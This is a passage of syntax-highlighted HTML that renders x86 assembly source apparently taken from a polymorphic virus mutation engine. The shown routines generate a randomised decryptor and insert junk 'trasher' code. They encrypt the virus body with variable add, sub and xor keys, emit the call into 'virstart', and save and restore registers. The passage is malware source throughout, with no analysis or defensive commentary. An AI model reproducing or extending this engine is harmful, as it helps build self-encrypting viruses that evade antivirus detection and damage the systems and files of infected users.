        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FL_OPCODE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FL_CODE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FL_HAVEREL</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FL_PRESENT</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FL_VPRESENT</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_arg1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ID_cycle</span><span class="sc0">                  </span><span class="sc1">; ID</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_arg2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                         </span><span class="sc1">; arg-size</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc5">trasher_on</span><span class="sc0">
</span><span class="sc5">__jx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">trasher_avail</span><span class="sc0">


</span><span class="sc1">; end-of-decryptor stuff</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">new_exit_method</span><span class="sc0">

</span><span class="sc5">old_exit_method</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; call virstart</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_callvirstart</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">trasher_avail</span><span class="sc0">
</span><span class="sc1">; restore regs</span><span class="sc0">
</span><span class="sc1">; retn</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_restregs</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">xxx_exit_method_done</span><span class="sc0">

</span><span class="sc5">new_exit_method</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; .a</span><span class="sc0">

</span><span class="sc1">; restore regs</span><span class="sc0">
</span><span class="sc1">; retn</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_restregs</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">xxx_exit_method_done</span><span class="sc0">    </span><span class="sc1">; skip [call virstart] at all</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">call_do_callvirstart</span><span class="sc0">    </span><span class="sc1">; skip [skip some opcodes]</span><span class="sc0">

</span><span class="sc1">; skip some opcodes</span><span class="sc0">
        </span><span class="sc1">;;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ret_to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">hooy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">re_skip</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;       mov     eax, buf_ptr</span><span class="sc0">
</span><span class="sc1">;       mov     [eax].dword ptr 0, 0cccccccch</span><span class="sc0">
</span><span class="sc1">;       mov     buf_size, 4</span><span class="sc0">
</span><span class="sc1">;       call    flush_as_opcode</span><span class="sc0">
</span><span class="sc1">;       mov     ebx, [ebx].h_next</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_flags</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FL_HAVEREL</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__norel</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__norel</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_arg1</span><span class="sc0">

</span><span class="sc5">__norel</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">re_skip</span><span class="sc0">

</span><span class="sc1">; call virstart</span><span class="sc0">
</span><span class="sc5">call_do_callvirstart</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_callvirstart</span><span class="sc0">

</span><span class="sc5">xxx_exit_method_done</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc1">; src</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_hooy</span><span class="sc0">

        </span><span class="sc1">; src:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_label</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_oldrva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ID_src</span><span class="sc0">

        </span><span class="sc1">; db xx,yy,zz,...               ; virsize byte(s)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_ptr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">user_param</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.v_virptr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.v_virsize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">buf_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">z_key1</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">@@ccc</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsd</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">z_cmd1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cmd_add</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@add1</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">z_cmd1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cmd_sub</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@sub1</span><span class="sc0">
</span><span class="sc5">@@xor1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">;z_key1</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@ok1</span><span class="sc0">
</span><span class="sc5">@@add1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">;z_key1</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@ok1</span><span class="sc0">
</span><span class="sc5">@@sub1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">;z_key1</span><span class="sc0">
</span><span class="sc5">@@ok1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">z_cmd2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cmd_add</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@add2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">z_cmd2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cmd_sub</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@sub2</span><span class="sc0">
</span><span class="sc5">@@xor2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">z_key2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@ok2</span><span class="sc0">
</span><span class="sc5">@@add2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">z_key2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@ok2</span><span class="sc0">
</span><span class="sc5">@@sub2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">z_key2</span><span class="sc0">
</span><span class="sc5">@@ok2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@ccc</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FL_DATA</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FL_PRESENT</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FL_VPRESENT</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush</span><span class="sc0">

                        </span><span class="sc6">nop</span><span class="sc0">
                        </span><span class="sc6">nop</span><span class="sc0">

                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; 0=SUCCESS</span><span class="sc0">
</span><span class="sc5">mutate_exit</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; popa.eax</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">
                        </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">mutate_error</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">save_esp</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">mutate_exit</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">do_callvirstart</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__q1</span><span class="sc0">

</span><span class="sc5">__q0</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_ptr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15FFh</span><span class="sc0">                 </span><span class="sc1">; call dword ptr [...]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">buf_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_as_opcode</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_as_fixup</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_arg1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_dstptr</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__qx</span><span class="sc0">

</span><span class="sc5">__q1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">out_call</span><span class="sc0">                      </span><span class="sc1">; call near ptr dst</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_arg1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ID_dst</span><span class="sc0">
</span><span class="sc5">__qx</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">retn</span><span class="sc0">


</span><span class="sc5">do_restregs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">d_count</span><span class="sc0">
</span><span class="sc5">__c2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">trasher_avail</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">d_reg</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">var_temp0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">restreg</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__c2</span><span class="sc0">

</span><span class="sc1">; retn</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">calltype</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ret_1</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ret1</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ret2</span><span class="sc0">
</span><span class="sc5">ret0</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">ret1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_ptr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc0">                  </span><span class="sc1">; retn</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">buf_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_as_opcode</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">retx</span><span class="sc0">
</span><span class="sc5">ret2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">out_jmp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_arg1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ID_jmpto</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">retx</span><span class="sc0">
</span><span class="sc5">ret_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; check if we're using decryptor-w/o-call &amp;&amp; (jmpprob != 0)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">hooy</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.h_next</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ret_to</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">retx</span><span class="sc0">

        </span><span class="sc1">; now, fix such situation: decryptor is splitted into parts</span><span class="sc0">
        </span><span class="sc1">; and linked with jmp, but there was no CALL decryptor.</span><span class="sc0">
        </span><span class="sc1">; so, we must insert additional jmp</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">out_jmp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_arg1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ID_link</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">root</span><span class="sc0">
</span><span class="sc5">__i1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">hooy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_next</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ret_to</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__i1</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_label</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_oldrva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ID_link</span><span class="sc0">
</span><span class="sc5">retx</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">getreg</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">__rr</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">; esp</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__rr</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">  </span><span class="sc1">; ebp</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__rr</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">savereg</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc5">d_type</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">s1</span><span class="sc0">

</span><span class="sc5">s0</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_ptr</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; push reg32</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">buf_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_as_opcode</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">sx</span><span class="sc0">

</span><span class="sc5">s1</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc5">mac1</span><span class="sc0">    </span><span class="sc5">cmd_v_r</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cmd_mov</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">sx</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc6">bts</span><span class="sc0">     </span><span class="sc5">regavail</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">restreg</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">btr</span><span class="sc0">     </span><span class="sc5">regavail</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                        </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc5">d_type</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">r1</span><span class="sc0">

</span><span class="sc5">r0</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_ptr</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; pop reg32</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">buf_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_as_opcode</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">rx</span><span class="sc0">

</span><span class="sc5">r1</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc5">mac1</span><span class="sc0">    </span><span class="sc5">cmd_r_v</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cmd_mov</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">rx</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">var_alloc_1</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_hooy</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_label</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_oldrva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_as_fixup</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_arg1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                        </span><span class="sc6">retn</span><span class="sc0">

